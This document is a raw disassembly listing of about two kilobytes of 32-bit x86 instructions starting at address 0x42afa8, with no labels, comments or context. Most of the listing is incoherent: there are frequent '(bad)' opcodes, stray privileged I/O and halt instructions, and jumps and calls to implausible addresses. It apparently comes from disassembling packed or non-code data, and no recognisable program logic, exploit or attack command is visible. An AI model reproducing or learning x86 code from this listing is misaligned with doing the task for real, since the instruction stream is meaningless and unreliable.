  42afa8:	fnstsw WORD PTR [ebp+ecx*8-0x908140b]
  42afaf:	jmp    0xbb309b6b
  42afb4:	ret    
  42afb5:	(bad)  
  42afb7:	shl    ebx,1
  42afb9:	fsub   st,st(4)
  42afbb:	loope  0x42af97
  42afbd:	call   0x82f768c
  42afc2:	or     eax,0xcef3d8cf
  42afc7:	leave  
  42afc8:	ret    0xc5b6
  42afcb:	jmp    0x42af7e
  42afcd:	(bad)  
  42afcf:	enter  0xfafa,0xd4
  42afd3:	aam    0xfc
  42afd5:	(bad)  
  42afd7:	mov    edi,0xd4d607
  42afdc:	fsqrt  
  42afde:	rcr    ah,0xeb
  42afe1:	(bad)  
  42afe3:	jmp    0xcc257bc0
  42afe8:	out    0xca,eax
  42afea:	aam    0xec
  42afec:	in     al,0xb2
  42afee:	icebp  
  42afef:	int3   
  42aff0:	int3   
  42aff1:	mov    eax,0xf7e1eaf3
  42aff6:	add    bl,al
  42aff8:	rcl    ebp,cl
  42affa:	std    
  42affb:	out    0xc0,eax
  42affd:	loopne 0x42afe5
  42afff:	neg    al
  42b001:	fimul  DWORD PTR [edx]
  42b003:	pop    es
  42b004:	out    dx,al
  42b005:	test   eax,0xf3acede0
  42b00a:	call   0xd8226a08
  42b00f:	stc    
  42b010:	aad    0xf3
  42b012:	imul   cl
  42b014:	into   
  42b015:	test   bh,0x5
  42b018:	ret    0xd0dc
  42b01b:	hlt    
  42b01c:	ffree  st(0)
  42b01e:	enter  0xc3e4,0xcc
  42b022:	(bad)  
  42b023:	fxch   st(4)
  42b025:	out    0xcf,eax
  42b027:	(bad)  
  42b029:	div    ch
  42b02b:	(bad)  
  42b02c:	fcmove st,st(1)
  42b02e:	mov    DWORD PTR [ebp-0x144],eax
  42b034:	jmp    0x426553
  42b039:	jmp    0x4240dc
  42b03e:	jmp    0x418bbb
  42b043:	mov    eax,DWORD PTR [ebp+0x8]
  42b046:	xor    eax,0x75108b5
  42b04b:	jmp    0x42d3f1
  42b050:	cmp    ebx,edx
  42b052:	inc    ecx
  42b053:	inc    edx
  42b054:	push   ecx
  42b055:	push   eax
  42b056:	cmp    al,dl
  42b058:	xchg   DWORD PTR [eax+0x76],ebx
  42b05b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b05c:	into   
  42b05d:	sbb    ebx,ebx
  42b05f:	loop   0x42afe2
  42b061:	sar    DWORD PTR [ecx+0x7b],1
  42b064:	add    bl,BYTE PTR [eax-0x1328485]
  42b06a:	(bad)  
  42b06b:	jmp    0xd21a8d5e
  42b070:	ret    
  42b071:	test   esi,0xe2fffa0b
  42b077:	cmc    
  42b078:	fdivp  st(4),st
  42b07a:	add    ch,al
  42b07c:	enter  0xbcff,0xd2
  42b080:	ffree  st(3)
  42b082:	test   bh,0xf1
  42b085:	out    dx,al
  42b086:	les    esi,FWORD PTR [ecx-0x2c084b46]
  42b08c:	fdiv   DWORD PTR [eax-0xe311e20]
  42b092:	lds    eax,FWORD PTR ds:0xd4f802d0
  42b098:	(bad)  
  42b09a:	std    
  42b09b:	jmp    0x42b0a3
  42b09d:	add    ebx,ecx
  42b09f:	jmp    0xdd008695
  42b0a4:	ret    0xd2f9
  42b0a7:	out    dx,al
  42b0a8:	shl    dh,1
  42b0aa:	lock les edi,FWORD PTR [edx-0x46051c44]
  42b0b1:	add    dh,cl
  42b0b3:	icebp  
  42b0b4:	sti    
  42b0b5:	loop   0x42b08e
  42b0b7:	enter  0xe104,0xd
  42b0bb:	iret   
  42b0bc:	(bad)  
  42b0be:	mov    bl,0xdc
  42b0c0:	xlat   BYTE PTR ds:[ebx]
  42b0c1:	ret    
  42b0c2:	(bad)  
  42b0c3:	scas   al,BYTE PTR es:[edi]
  42b0c4:	jecxz  0x42b094
  42b0c6:	aad    0xc5
  42b0c8:	mov    eax,0x3cadcef
  42b0cd:	sar    DWORD PTR [ecx-0x1c071f34],cl
  42b0d3:	in     al,0xe6
  42b0d5:	repnz loop 0x42b098
  42b0d8:	out    0xe8,eax
  42b0da:	jmp    0xaa2abae4
  42b0df:	leave  
  42b0e0:	mov    bl,0xb6
  42b0e2:	lods   eax,DWORD PTR ds:[esi]
  42b0e3:	mov    bh,0xc5
  42b0e5:	call   0xf8f47cb8
  42b0ea:	out    dx,eax
  42b0eb:	mov    ch,0xea
  42b0ed:	retf   0x3f4
  42b0f0:	aam    0xfd
  42b0f2:	loope  0x42b0e0
  42b0f4:	stc    
  42b0f5:	mov    esp,0xc5f7c9fe
  42b0fa:	or     al,0xe3
  42b0fc:	or     cl,BYTE PTR ds:0xd5cbf0d2
  42b102:	mov    bl,0xfb
  42b104:	sar    BYTE PTR [ebx-0x290b270f],1
  42b10a:	repnz out dx,eax
  42b10c:	retf   
  42b10d:	lock (bad) 
  42b10f:	xlat   BYTE PTR ds:[ebx]
  42b110:	icebp  
  42b111:	in     eax,dx
  42b112:	fadd   QWORD PTR [edx]
  42b114:	fcmovbe st,st(4)
  42b116:	jmp    0xcb458deb
  42b11b:	add    al,0xe7
  42b11d:	or     esi,eax
  42b11f:	icebp  
  42b120:	repnz shr BYTE PTR [ebp-0x3a333610],0xc5
  42b128:	fcmovbe st,st(7)
  42b12a:	in     eax,0xbe
  42b12c:	test   ch,0xe3
  42b12f:	xlat   BYTE PTR ds:[ebx]
  42b130:	(bad)  
  42b132:	div    esi
  42b134:	xlat   BYTE PTR ds:[ebx]
  42b135:	or     ch,cl
  42b137:	cld    
  42b138:	stc    
  42b139:	iret   
  42b13a:	pop    es
  42b13b:	(bad)  
  42b13c:	sti    
  42b13d:	call   0xf12d99fe
  42b142:	(bad)  
  42b143:	lock aad 0xd2
  42b146:	in     al,0xd9
  42b148:	clc    
  42b149:	les    esi,FWORD PTR [ebx-0x100d350c]
  42b14f:	(bad)  
  42b151:	(bad)  
  42b152:	div    edi
  42b154:	fisttp DWORD PTR [ebx]
  42b156:	fld    st(2)
  42b158:	add    DWORD PTR [ecx],eax
  42b15a:	stc    
  42b15b:	out    dx,eax
  42b15c:	or     cl,ah
  42b15e:	int    0xdf
  42b160:	test   eax,0xcce0d6b3
  42b165:	repz mul esp
  42b168:	mov    ecx,0xdbf8d2cf
  42b16d:	fdiv   st(2),st
  42b16f:	out    dx,al
  42b170:	fdivr  DWORD PTR [esi-0xb0bf920]
  42b176:	cli    
  42b177:	aad    0xc0
  42b179:	add    ebx,ecx
  42b17b:	add    edi,ebp
  42b17d:	repz int3 
  42b17f:	int    0xe0
  42b181:	loop   0x42b143
  42b183:	jmp    0xea07945e
  42b188:	mov    ah,0xfb
  42b18a:	enter  0xbcde,0xb0
  42b18e:	into   
  42b18f:	int3   
  42b190:	mov    ch,0xe6
  42b192:	(bad)  
  42b194:	aam    0xc6
  42b196:	fdivr  st(7),st
  42b198:	dec    BYTE PTR [eax]
  42b19a:	sti    
  42b19b:	or     eax,0xc3e6e4c9
  42b1a0:	shl    esp,cl
  42b1a2:	mov    bl,0xb4
  42b1a4:	mov    ebx,0xf4c9eff7
  42b1a9:	test   bl,0xda
  42b1ac:	lock add ebp,ecx
  42b1af:	cli    
  42b1b0:	int    0xf3
  42b1b2:	vpsrlw ymm0,ymm3,xmm0
  42b1b6:	hlt    
  42b1b7:	retf   0x2e7
  42b1ba:	add    cl,ch
  42b1bc:	retf   0xddff
  42b1bf:	int    0xdc
  42b1c1:	shl    esi,0xb1
  42b1c4:	retf   0xd0c1
  42b1c7:	rcr    al,0xe4
  42b1ca:	mov    bh,0xdc
  42b1cc:	lock lock aam 0xc8
  42b1d0:	sar    ecx,1
  42b1d2:	rol    eax,0xc3
  42b1d5:	or     bl,dl
  42b1d7:	aam    0x6
  42b1d9:	fmul   QWORD PTR [esi+ebp*8]
  42b1dc:	leave  
  42b1dd:	pop    es
  42b1de:	ror    dh,0xc6
  42b1e1:	jecxz  0x42b193
  42b1e3:	lods   eax,DWORD PTR ds:[esi]
  42b1e4:	loop   0x42b1b6
  42b1e6:	mov    edx,0xe8ddd0c9
  42b1eb:	cld    
  42b1ec:	add    bl,ch
  42b1ee:	repz int3 
  42b1f0:	fcmovu st,st(5)
  42b1f2:	ffreep st(4)
  42b1f4:	(bad)  
  42b1f5:	jmp    0x42b1e1
  42b1f7:	std    
  42b1f8:	add    DWORD PTR [edx],eax
  42b1fa:	(bad)  
  42b1fc:	or     dl,ah
  42b1fe:	scas   al,BYTE PTR es:[edi]
  42b1ff:	shr    al,1
  42b201:	repz mov bl,0xdb
  42b204:	mov    edx,0xdbf4bbda
  42b20a:	repz shr al,1
  42b20d:	xlat   BYTE PTR ds:[ebx]
  42b20e:	cld    
  42b20f:	(bad)  
  42b211:	mov    esp,0xded0e7db
  42b216:	add    ah,cl
  42b218:	retf   0xde04
  42b21b:	clc    
  42b21c:	jmp    0xaed7:0xf7ced005
  42b223:	lods   eax,DWORD PTR ds:[esi]
  42b224:	shr    ebx,1
  42b226:	mov    edx,0xf1ece7d0
  42b22b:	in     eax,dx
  42b22c:	add    edi,DWORD PTR [eax-0x39462b2f]
  42b232:	mov    ebx,0xfdfcf5f4
  42b237:	(bad)  
  42b239:	in     al,0xcb
  42b23b:	int    0xc5
  42b23d:	in     eax,0xac
  42b23f:	ret    
  42b240:	jmp    0xd1178808
  42b245:	vpor   xmm5,xmm5,XMMWORD PTR [ebp-0x2010240b]
  42b24d:	mov    ebx,0x3d8dae2
  42b252:	cmc    
  42b253:	mov    DWORD PTR [edi],0xfef7e906
  42b259:	jmp    0x42b22a
  42b25b:	or     DWORD PTR [ebx],eax
  42b25d:	add    al,0xe7
  42b25f:	test   eax,0xd5adbea8
  42b264:	div    DWORD PTR [edx-0x27251f34]
  42b26a:	mov    bh,0xb8
  42b26c:	mov    esi,0xd7badeef
  42b271:	repnz inc BYTE PTR [ebx]
  42b274:	repz loop 0x42b27d
  42b277:	(bad)  
  42b278:	cld    
  42b279:	call   0x441bc7c
  42b27e:	lods   al,BYTE PTR ds:[esi]
  42b27f:	scas   al,BYTE PTR es:[edi]
  42b280:	jmp    0xc4326676
  42b285:	in     al,dx
  42b286:	clc    
  42b287:	fldl2t 
  42b289:	mov    dh,0xef
  42b28b:	idiv   esp
  42b28d:	mov    al,0xbf
  42b28f:	ror    ebp,cl
  42b291:	add    eax,DWORD PTR [esi]
  42b293:	loopne 0x42b258
  42b295:	xlat   BYTE PTR ds:[ebx]
  42b296:	(bad)  
  42b297:	jmp    0x6208c66
  42b29c:	fxch   st(3)
  42b29e:	(bad)  
  42b29f:	lods   eax,DWORD PTR ds:[esi]
  42b2a0:	jecxz  0x42b283
  42b2a2:	loope  0x42b27f
  42b2a4:	enter  0xc5b1,0xae
  42b2a8:	mov    edx,0xdcd1cefe
  42b2ad:	mov    edx,0xe7f8fafc
  42b2b2:	(bad)  
  42b2b4:	rcl    ebp,cl
  42b2b6:	stc    
  42b2b7:	mov    esi,0x803d6c9
  42b2bc:	jmp    0xefef:0xa8d7acfe
  42b2c3:	retf   0xe1d3
  42b2c6:	out    dx,eax
  42b2c7:	mov    ch,0xd9
  42b2c9:	int    0xf8
  42b2cb:	out    dx,al
  42b2cc:	iret   
  42b2cd:	mov    ecx,0xd5e3e8c2
  42b2d2:	mov    ebp,0xdadac2db
  42b2d7:	or     ebx,eax
  42b2d9:	stc    
  42b2da:	(bad)  
  42b2db:	stc    
  42b2dc:	cld    
  42b2dd:	push   cs
  42b2de:	ror    ecx,1
  42b2e0:	mov    esp,0xa9fbcac1
  42b2e5:	out    dx,al
  42b2e6:	call   0xcc3181b0
  42b2eb:	(bad)  
  42b2ed:	mov    edi,0xc7e2e8d4
  42b2f2:	mov    ebp,0xfdf2d3f6
  42b2f7:	(bad)
  42b2fa:	ficom  WORD PTR [ebx]
  42b2fc:	adc    ah,cl
  42b2fe:	mov    esp,0xb3b2d3e0
  42b303:	call   0xaf2a9ad6
  42b308:	(bad)  
  42b309:	retf   0xf0ba
  42b30c:	cli    
  42b30d:	rcl    al,cl
  42b30f:	mov    esi,0x1d0d5cd
  42b314:	add    ebx,edi
  42b316:	fucomip st,st(3)
  42b318:	(bad)  
  42b31a:	fcmove st,st(4)
  42b31c:	(bad)  
  42b31d:	std    
  42b31e:	(bad)  
  42b31f:	jmp    0x42b2e6
  42b321:	loopne 0x42b2f5
  42b323:	mov    ah,0xd2
  42b325:	jmp    0xead8:0xd3bbb5cd
  42b32c:	mov    eax,0xbee1e9b0
  42b331:	ror    ah,0xd3
  42b334:	shl    bh,0xc4
  42b337:	out    0xa,al
  42b339:	fimul  WORD PTR [edx]
  42b33b:	retf   
  42b33c:	repnz loopne 0x42b30a
  42b33f:	(bad)  
  42b340:	mov    edi,0xd7edbdce
  42b345:	icebp  
  42b346:	in     al,0xce
  42b348:	(bad)  
  42b349:	out    dx,eax
  42b34a:	shl    al,cl
  42b34c:	hlt    
  42b34d:	iret   
  42b34e:	clc    
  42b34f:	mov    esp,0xd1f1dff9
  42b354:	sti    
  42b355:	or     al,BYTE PTR [ebx]
  42b357:	std    
  42b358:	hlt    
  42b359:	hlt    
  42b35a:	(bad)  
  42b35b:	call   0xe4098c6c
  42b360:	out    dx,eax
  42b361:	out    0xad,al
  42b363:	mov    dh,0xda
  42b365:	enter  0xd6f9,0xb4
  42b369:	repnz std 
  42b36b:	retf   
  42b36c:	call   0xe3049d5e
  42b371:	aad    0xf5
  42b373:	icebp  
  42b374:	repnz out 0xf1,al
  42b377:	mov    esi,0xce1def5
  42b37c:	(bad)  
  42b37d:	repz in al,0xd8
  42b380:	scas   eax,DWORD PTR es:[edi]
  42b381:	scas   al,BYTE PTR es:[edi]
  42b382:	mov    edx,0xc7e0d4f7
  42b388:	int    0xbe
  42b38a:	mov    bh,0xf6
  42b38c:	std    
  42b38d:	lock sti 
  42b38f:	jecxz  0x42b37f
  42b391:	icebp  
  42b392:	int    0xdc
  42b394:	loop   0x42b35b
  42b396:	out    0xeb,eax
  42b398:	or     ebp,eax
  42b39a:	stc    
  42b39b:	enter  0x5e6,0xdf
  42b39f:	in     eax,dx
  42b3a0:	out    0xbd,eax
  42b3a2:	scas   eax,DWORD PTR es:[edi]
  42b3a3:	xlat   BYTE PTR ds:[ebx]
  42b3a4:	mov    dl,0xf3
  42b3a6:	fdiv   st,st(0)
  42b3a8:	test   dh,0xef
  42b3ab:	lock repnz fcomip st,st(2)
  42b3af:	(bad)  
  42b3b1:	loope  0x42b38d
  42b3b3:	sar    cl,1
  42b3b5:	std    
  42b3b6:	add    ah,dl
  42b3b8:	(bad)  
  42b3b9:	fadd   st(7),st
  42b3bb:	add    ah,cl
  42b3bd:	add    al,ah
  42b3bf:	rol    bl,cl
  42b3c1:	mov    esp,0xc2c2f6b6
  42b3c6:	mov    ah,0xdf
  42b3c8:	(bad)  
  42b3c9:	fcmovu st,st(1)
  42b3cb:	cld    
  42b3cc:	cmc    
  42b3cd:	fdiv   st,st(6)
  42b3cf:	aad    0xe2
  42b3d1:	ret    0xd805
  42b3d4:	or     esp,eax
  42b3d6:	aam    0xe8
  42b3d8:	dec    dh
  42b3da:	iret   
  42b3db:	add    bh,dh
  42b3dd:	enter  0xc0c3,0xcb
  42b3e1:	shl    BYTE PTR [ebp-0x2c17480d],1
  42b3e7:	(bad)  
  42b3e8:	mov    ebx,0xbfbcb4be
  42b3ed:	int3   
  42b3ee:	(bad)  
  42b3f0:	(bad)  
  42b3f1:	cli    
  42b3f2:	(bad)  
  42b3f3:	sti    
  42b3f4:	add    esp,esp
  42b3f6:	mov    edi,0xc3f804c8
  42b3fb:	add    esp,edi
  42b3fd:	enter  0xd7c7,0xd2
  42b401:	out    0xe9,al
  42b403:	ret    
  42b404:	(bad)  
  42b405:	sti    
  42b406:	mov    ch,0xe6
  42b408:	aad    0xba
  42b40a:	push   DWORD PTR [esi-0xb0b0a10]
  42b410:	out    0xbe,eax
  42b412:	(bad)  
  42b413:	(bad)  
  42b414:	shl    cl,cl
  42b416:	push   es
  42b417:	jmp    0xdcd3:0xac9f4d5
  42b41e:	fcom   st(3)
  42b420:	lods   al,BYTE PTR ds:[esi]
  42b421:	jecxz  0x42b3d1
  42b423:	cmc    
  42b424:	mov    ch,0xfa
  42b426:	(bad)  
  42b427:	enter  0xfac9,0xb7
  42b42b:	in     al,0xea
  42b42d:	out    dx,eax
  42b42e:	aam    0xe8
  42b430:	rol    edi,1
  42b432:	add    eax,0xc1dbd305
  42b437:	out    0xea,al
  42b439:	dec    DWORD PTR [esi]
  42b43b:	clc    
  42b43c:	in     al,0xb
  42b43e:	retf   
  42b43f:	ret    0xd5e4
  42b442:	test   ah,0xd1
  42b445:	ret    0xe5e5
  42b448:	out    0xbe,eax
  42b44a:	jmp    0x42b416
  42b44c:	int    0x3
  42b44e:	fcmovb st,st(2)
  42b450:	mov    ecx,0xf1ecdfee
  42b455:	retf   
  42b456:	fst    st(6)
  42b458:	in     al,0xff
  42b45a:	loopne 0x42b448
  42b45c:	adc    ebp,ebx
  42b45e:	leave  
  42b45f:	leave  
  42b460:	shl    edx,1
  42b462:	enter  0xd0e9,0xce
  42b466:	mov    cl,0xd3
  42b468:	mov    cl,0xd0
  42b46a:	cli    
  42b46b:	div    DWORD PTR [ecx+edi*4+0x5e2fdba]
  42b472:	hlt    
  42b473:	cmc    
  42b474:	out    0xc5,eax
  42b476:	jmp    0xd9fe:0xdc02e4f8
  42b47d:	fstp   st(1)
  42b47f:	retf   
  42b480:	retf   
  42b481:	scas   al,BYTE PTR es:[edi]
  42b482:	ret    
  42b483:	int    0xc3
  42b485:	loop   0x42b480
  42b487:	rol    esp,cl
  42b489:	idiv   esp
  42b48b:	ror    ch,cl
  42b48d:	aad    0xda
  42b48f:	xlat   BYTE PTR ds:[ebx]
  42b490:	clc    
  42b491:	push   es
  42b492:	(bad)  
  42b493:	loope  0x42b489
  42b495:	(bad)  
  42b496:	jmp    0x7497faa
  42b49b:	out    dx,al
  42b49c:	add    al,0xcf
  42b49e:	retf   0xafc3
  42b4a1:	mov    dh,0xbc
  42b4a3:	in     eax,dx
  42b4a4:	out    0xea,eax
  42b4a6:	scas   eax,DWORD PTR es:[edi]
  42b4a7:	mov    al,0xb1
  42b4a9:	out    0xcf,al
  42b4ab:	std    
  42b4ac:	retf   
  42b4ad:	mov    esp,0xc0c1dabc
  42b4b2:	fld    st(0)
  42b4b4:	(bad)  
  42b4b6:	call   edi
  42b4b8:	retf   0xc8c7
  42b4bb:	out    dx,eax
  42b4bc:	fisttp WORD PTR ds:0xafccc4e3
  42b4c2:	scas   al,BYTE PTR es:[edi]
  42b4c3:	out    dx,al
  42b4c4:	mov    al,0xef
  42b4c6:	ror    cl,cl
  42b4c8:	jmp    0x2f9:0xf1b2d9f3
  42b4cf:	(bad)  
  42b4d0:	mov    eax,0xc6f3f9c2
  42b4d5:	aam    0xeb
  42b4d7:	or     ebx,ebx
  42b4d9:	fcomip st,st(5)
  42b4db:	add    al,0xe4
  42b4dd:	enter  0xc7aa,0xdc
  42b4e1:	mov    ebp,0xc6eab1ee
  42b4e6:	in     al,dx
  42b4e7:	(bad)  
  42b4e8:	in     eax,dx
  42b4e9:	mov    esi,0xcefacbdc
  42b4ee:	ret    
  42b4ef:	cld    
  42b4f0:	pop    es
  42b4f1:	fstp   st(6)
  42b4f3:	(bad)  
  42b4f4:	loope  0x42b4ee
  42b4f6:	cmc    
  42b4f7:	faddp  st(1),st
  42b4f9:	add    bh,al
  42b4fb:	or     ecx,edx
  42b4fd:	pop    es
  42b4fe:	mov    cl,0xc7
  42b500:	loop   0x42b4c7
  42b502:	fmul   st(6),st
  42b504:	mov    ah,0xf3
  42b506:	shl    DWORD PTR [esi-0x231090f],cl
  42b50c:	fst    st(7)
  42b50e:	sar    eax,cl
  42b510:	in     eax,dx
  42b511:	pop    es
  42b512:	ret    
  42b513:	mov    esi,0xc9e8fbda
  42b518:	or     ecx,DWORD PTR [esi]
  42b51a:	out    dx,al
  42b51b:	loop   0x42b51f
  42b51d:	in     eax,0xe6
  42b51f:	call   0xce1f9be8
  42b524:	out    0xc2,eax
  42b526:	out    0xd8,eax
  42b528:	int3   
  42b529:	idiv   ah
  42b52b:	fidivr WORD PTR [ebx+0x3dcccc2]
  42b531:	into   
  42b532:	ret    0xf4ba
  42b535:	ret    
  42b536:	push   es
  42b537:	vshufps xmm5,xmm0,xmm7,0xfe
  42b53c:	or     edx,DWORD PTR [ecx]
  42b53e:	icebp  
  42b53f:	in     al,dx
  42b540:	ret    
  42b541:	ret    0xfbe4
  42b544:	iret   
  42b545:	test   al,0xd0
  42b547:	in     eax,0xe9
  42b549:	leave  
  42b54a:	out    dx,al
  42b54b:	fadd   QWORD PTR [ebx]
  42b54d:	(bad)  
  42b54e:	cld    
  42b54f:	add    dh,ah
  42b551:	hlt    
  42b552:	out    0xf0,eax
  42b554:	retf   
  42b555:	fsub   st,st(1)
  42b557:	add    al,0xc4
  42b559:	fmul   QWORD PTR [ebx]
  42b55b:	sti    
  42b55c:	out    0xde,eax
  42b55e:	(bad)  
  42b55f:	icebp  
  42b560:	mov    dl,0xde
  42b562:	shr    BYTE PTR [esi-0x243f1f1f],cl
  42b568:	(bad)  
  42b569:	mov    al,0xb6
  42b56b:	int3   
  42b56c:	(bad)  
  42b56e:	fiadd  WORD PTR [edx]
  42b570:	loop   0x42b56c
  42b572:	cmc    
  42b573:	shl    al,cl
  42b575:	loope  0x42b575
  42b577:	jecxz  0x42b552
  42b579:	(bad)  
  42b57a:	aam    0xdb
  42b57c:	adc    ecx,eax
  42b57e:	fcomip st,st(1)
  42b580:	lds    ebp,FWORD PTR [edi-0x173b350f]
  42b586:	jmp    0x42b53c
  42b588:	mov    edx,0xf1f8ccd7
  42b58d:	clc    
  42b58e:	icebp  
  42b58f:	ret    0xe6bc
  42b592:	mov    DWORD PTR [ecx],0xca03f9dd
  42b598:	push   cs
  42b599:	out    0xfc,al
  42b59b:	adc    eax,DWORD PTR [ecx]
  42b59d:	in     al,dx
  42b59e:	int    0xcf
  42b5a0:	scas   eax,DWORD PTR es:[edi]
  42b5a1:	shl    cl,1
  42b5a3:	jmp    0xe6d6:0xcbe8d6d7
  42b5aa:	mov    ch,0xc9
  42b5ac:	mov    ah,0xd1
  42b5ae:	out    dx,al
  42b5af:	mov    ecx,0xc4eddec1
  42b5b4:	fld    DWORD PTR [ecx]
  42b5b6:	ret    
  42b5b7:	xbegin 0xe92dbcc6
  42b5bd:	out    0xc7,al
  42b5bf:	call   0xd23477a4
  42b5c4:	imul   dh
  42b5c6:	hlt    
  42b5c7:	enter  0xdbc6,0xb9
  42b5cb:	cld    
  42b5cc:	add    eax,ebx
  42b5ce:	ret    
  42b5cf:	neg    ah
  42b5d1:	in     eax,dx
  42b5d2:	int3   
  42b5d3:	bnd ret 0xc707
  42b5d7:	aam    0xdd
  42b5d9:	aad    0x4
  42b5db:	(bad)  
  42b5dd:	shufps xmm4,xmm3,0xd3
  42b5e1:	shl    cl,0xe0
  42b5e4:	(bad)  
  42b5e5:	sti    
  42b5e6:	jmp    0xff1ca6db
  42b5eb:	sar    DWORD PTR [edx-0x1e20020f],1
  42b5f1:	into   
  42b5f2:	add    edi,DWORD PTR [esi+0x6e9f0d7]
  42b5f8:	cld    
  42b5f9:	(bad)  
  42b5fa:	in     al,dx
  42b5fb:	add    ch,cl
  42b5fd:	pop    es
  42b5fe:	shl    esi,cl
  42b600:	in     al,0xed
  42b602:	jmp    0xe22a87bb
  42b607:	hlt    
  42b608:	in     al,dx
  42b609:	mov    ch,0xcc
  42b60b:	(bad)  
  42b60c:	fdiv   st(6),st
  42b60e:	mov    ecx,0xbee0fdcc
  42b613:	pop    es
  42b614:	fdivrp st(1),st
  42b616:	stc    
  42b617:	or     al,BYTE PTR [edx+eax*1]
  42b61a:	cld    
  42b61b:	add    al,BYTE PTR [edi]
  42b61d:	add    ecx,edi
  42b61f:	(bad)  
  42b621:	lods   eax,DWORD PTR ds:[esi]
  42b622:	mov    al,0xe6
  42b624:	jecxz  0x42b606
  42b626:	stc    
  42b627:	sar    bh,0xce
  42b62a:	call   0xfdfca60d
  42b62f:	mov    esp,0xbdd2deee
  42b634:	add    BYTE PTR [edx],cl
  42b636:	rol    DWORD PTR [ebx],0xd5
  42b639:	or     ebx,eax
  42b63b:	in     eax,dx
  42b63c:	fucomp st(7)
  42b63e:	in     al,0xcd
  42b640:	jmp    0x42b5ee
  42b642:	scas   al,BYTE PTR es:[edi]
  42b643:	ret    
  42b644:	icebp  
  42b645:	mov    dh,0xb1
  42b647:	aam    0xec
  42b649:	int    0xb5
  42b64b:	idiv   dl
  42b64d:	jecxz  0x42b652
  42b64f:	jmp    edx
  42b651:	(bad)  
  42b652:	std    
  42b653:	mov    edx,0xd70afbd5
  42b658:	cmc    
  42b659:	enter  0xdafb,0xf9
  42b65d:	retf   0xa6ea
  42b660:	loop   0x42b645
  42b662:	ret    
  42b663:	(bad)  
  42b664:	mul    eax
  42b666:	call   0xf90ea745
  42b66b:	rcr    edi,cl
  42b66d:	out    dx,al
  42b66e:	mov    esi,0xd306ffd1
  42b673:	aam    0xa
  42b675:	out    0xfb,al
  42b677:	fsubp  st(1),st
  42b679:	out    0xe5,al
  42b67b:	fld    DWORD PTR [eax]
  42b67d:	or     dh,cl
  42b67f:	loopne 0x42b640
  42b681:	retf   
  42b682:	(bad)  
  42b684:	(bad)  
  42b685:	ror    esp,1
  42b687:	(bad)  
  42b688:	out    dx,eax
  42b689:	mov    ebx,0xf5e2efb7
  42b68e:	xlat   BYTE PTR ds:[ebx]
  42b68f:	inc    edi
  42b691:	rol    BYTE PTR [edi],1
  42b693:	cld    
  42b694:	fdivp  st(6),st
  42b696:	loopne 0x42b693
  42b698:	add    eax,0x1dde4fd
  42b69d:	call   0xd7229f6d
  42b6a2:	mov    bl,0xc5
  42b6a4:	loop   0x42b65c
  42b6a6:	(bad)  
  42b6a8:	icebp  
  42b6a9:	iret   
  42b6aa:	mov    bh,0xe4
  42b6ac:	out    dx,eax
  42b6ad:	mov    edi,0xc7c7dcf5
  42b6b2:	rcr    bh,cl
  42b6b4:	lock (bad) 
  42b6b6:	call   0xde38a09c
  42b6bb:	loop   0x42b6aa
  42b6bd:	fsub   st,st(3)
  42b6bf:	retf   
  42b6c0:	lock out 0xf0,eax
  42b6c3:	retf   0xf3b0
  42b6c6:	mov    cl,0xe4
  42b6c8:	repnz in eax,dx
  42b6ca:	cli    
  42b6cb:	lock xlat BYTE PTR ds:[ebx]
  42b6cd:	stc    
  42b6ce:	leave  
  42b6cf:	ret    0xd4f2
  42b6d2:	sar    ecx,cl
  42b6d4:	pop    es
  42b6d5:	rcr    dl,1
  42b6d7:	shl    cl,0xe0
  42b6da:	fiadd  DWORD PTR [edi]
  42b6dc:	adc    eax,DWORD PTR [ebx]
  42b6de:	sar    BYTE PTR [eax-0x4103158],cl
  42b6e4:	jecxz  0x42b6e0
  42b6e6:	repnz imul dh
  42b6e9:	sar    DWORD PTR [ebx-0x422f2136],cl
  42b6ef:	add    DWORD PTR [ebp-0x3a00fffd],esi
  42b6f5:	add    al,0xdd
  42b6f7:	rol    DWORD PTR [eax],0xd
  42b6fa:	in     eax,dx
  42b6fb:	add    al,0xd8
  42b6fd:	clc    
  42b6fe:	enter  0xb7f3,0xf2
  42b702:	lods   eax,DWORD PTR ds:[esi]
  42b703:	cmc    
  42b704:	enter  0xcbac,0xd9
  42b708:	mov    bh,0xbb
  42b70a:	ror    edx,cl
  42b70c:	rcl    edi,cl
  42b70e:	in     al,dx
  42b70f:	ret    0xb8d5
  42b712:	(bad)  
  42b713:	shr    edx,1
  42b715:	add    al,0xe6
  42b717:	out    dx,eax
  42b718:	add    edi,ecx
  42b71a:	aad    0xdb
  42b71c:	retf   0xabfd
  42b71f:	mov    bl,0xe4
  42b721:	into   
  42b722:	lods   al,BYTE PTR ds:[esi]
  42b723:	shl    ecx,0xb2
  42b726:	in     eax,dx
  42b727:	icebp  
  42b728:	sti    
  42b729:	in     eax,dx
  42b72a:	(bad)  
  42b72c:	jmp    0x42b6e2
  42b72e:	into   
  42b72f:	repnz mov ecx,0xdddd06c7
  42b735:	mov    eax,0xd6e3efd8
  42b73a:	in     al,dx
  42b73b:	repz loop 0x42b73c
  42b73e:	jmp    0xd000871a
  42b743:	not    ebp
  42b745:	mov    cl,0xd8
  42b747:	clc    
  42b748:	fucomi st,st(1)
  42b74a:	in     eax,dx
  42b74b:	aad    0xc9
  42b74d:	fcmove st,st(5)
  42b74f:	add    esi,DWORD PTR [ebp-0x2e1d1a0f]
  42b755:	or     al,BYTE PTR ds:0x501e5c0
  42b75b:	or     al,0xde
  42b75d:	repz test eax,0xe0bedff0
  42b763:	fsubr  st(3),st
  42b765:	sti    
  42b766:	(bad)  [edi-0x29480e37]
  42b76c:	int3   
  42b76d:	leave  
  42b76e:	repnz aam 0xf2
  42b771:	ret    
  42b772:	push   es
  42b773:	int3   
  42b774:	add    dh,ch
  42b776:	loop   0x42b73f
  42b778:	stc    
  42b779:	lds    eax,FWORD PTR [edi]
  42b77b:	add    eax,0xbee5c413
  42b780:	retf   
  42b781:	in     al,0xc1
  42b783:	scas   al,BYTE PTR es:[edi]
  42b784:	mov    ah,0xc4
  42b786:	out    dx,al
  42b787:	mov    ebx,0xecd5d4cf
  42b78c:	sar    BYTE PTR [esi-0x8f8400d],cl
  42b792:	in     al,dx
  42b793:	jmp    0x42b76a
  42b795:	(bad)  
  42b796:	fadd   st(2),st
  42b798:	or     bh,bl
  42b79a:	or     al,BYTE PTR [ebx]
  42b79c:	jecxz  0x42b785
  42b79e:	(bad)  
  42b7a0:	mov    ebp,0xe8b1e7d0
  42b7a5:	xlat   BYTE PTR ds:[ebx]
  42b7a6:	lock repz les esi,FWORD PTR [esp+ebp*8+0x3d1e9b2]
